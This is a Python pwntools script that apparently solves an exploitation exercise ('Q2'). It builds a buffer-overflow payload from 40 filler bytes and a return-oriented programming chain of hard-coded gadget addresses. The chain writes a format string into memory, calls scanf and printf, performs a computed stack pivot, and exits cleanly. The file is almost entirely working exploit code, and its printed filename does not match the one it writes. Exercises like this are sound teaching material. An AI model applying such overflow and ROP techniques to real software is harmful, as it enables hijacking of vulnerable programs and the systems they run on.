from pwn import *

# Construct the payload
payload = b"A" * 40

# Add the specified addresses in little-endian format
addresses = [
# Manually create %d without \n ! , 
# cannot alter %d\n string already present
    0x080cf49a, # pop eax ; ret
    0x0810b044, # Address of just after %d
    0x0804978c, # xchg edx, eax ; ret
    0x080cf49a, # pop eax ; ret
    0x00000025, # % char
    0x08072222, # mov byte ptr [edx], al ; mov eax, edx ; ret

    0x080cf49a, # pop eax ; ret
    0x0810b045, # Address of just after %d
    0x0804978c, # xchg edx, eax ; ret
    0x080cf49a, # pop eax ; ret
    0x00000064, # d char
    0x08072222, # mov byte ptr [edx], al ; mov eax, edx ; ret

    0x080cf49a, # pop eax ; ret
    0x0810b046, # Address of just after %d
    0x0804978c, # xchg edx, eax ; ret
    0x080cf49a, # pop eax ; ret
    0x00000000, # NULL value
    0x08072222, # mov byte ptr [edx], al ; mov eax, edx ; ret

# Scanf into eax register
    0x08052200, # scanf
    0x0807cf5c, # Adds 12 to esp
    # 0x080d3037, # %d
    0x0810b044, # %d NEW
    0x0810b040, # Variable address
    0x00000000, # Filler (as we are adding 12 to esp)

    0x080cf49a, # pop eax
    0x0810b040, # Variable address
    0x08066480, # Put value into eax

# Load N into edi
    0x0806ba7b, # xchg ecx, eax
    0x080497a1, # xchg edi, ecx
    0x080497f7, # eax = 0
    0x0807dfd5, # inc eax
    0x0806750e, # xchg ebp, eax
    0x08049808, # ecx = 0

# Load offset into edx
    0x080497f7,  # xor eax, eax
    0x08049768,  # add eax, 0xa (eax = 10)
    0x08049768,  # add eax, 0xa (eax = 20)
    0x08049768,  # add eax, 0xa (eax = 30)
    0x08049768,  # add eax, 0xa (eax = 40)
    0x08049768,  # add eax, 0xa (eax = 50)
    0x08049768,  # add eax, 0xa (eax = 60)
    0x08049768,  # add eax, 0xa (eax = 70)
    0x08049768,  # add eax, 0xa (eax = 80)
    0x0804978c,  # xchg eax, edx

# Swap values
    0x0805eb47,  # add ecx, ebp
    0x0806750e,  # xchg ebp, eax
    0x0806ba7b,  # xchg eax, ecx
    0x0806750e,  # xchg ebp, eax
    0x0804962f,  # nop

# Second sequence - Final adjustment
    0x080497f7,  # xor eax, eax
    0x08051fee,  # dec edi
    0x0806dbc0,  # cmovne eax, edx
    0x0804978c,  # xchg edx, eax
    0x08049786,  # sub esp, edx

# To print:
# First edx should contain 28
    0x080cf49a,  # pop eax ; ret
    0x0000001c,  # value = 28
    0x0804978c,  # xchg edx, eax ; ret
# Next eax should contain the value required
    0x0806ba7b,  # xchg ecx, eax
# Now start playing THE GAME to ensure clean exit after printf
    0x08049a9d,  # pop ebx ; pop esi ; pop edi ; ret
    0x08049b0b,  # jmp *(edi)
    0x08050c60,  # exit
    0x080d3037,  # %d
    0x080c6fbc,  # push eax ; pop ebx ; pop esi ; pop edi ; ret
    0x08049710,  # ret
    0x08052230,  # printf (popped into edi)
    0x08049786,  # sub esp, edx ; ret

    0x0a000000   # Newline -- at MSB
]

# Append addresses to the payload
for addr in addresses:
    payload += p32(addr)

# Save payload to a file
with open("solution_Q2", "wb") as f:
    f.write(payload)
print("[+] Payload written to 'payload_Q2'")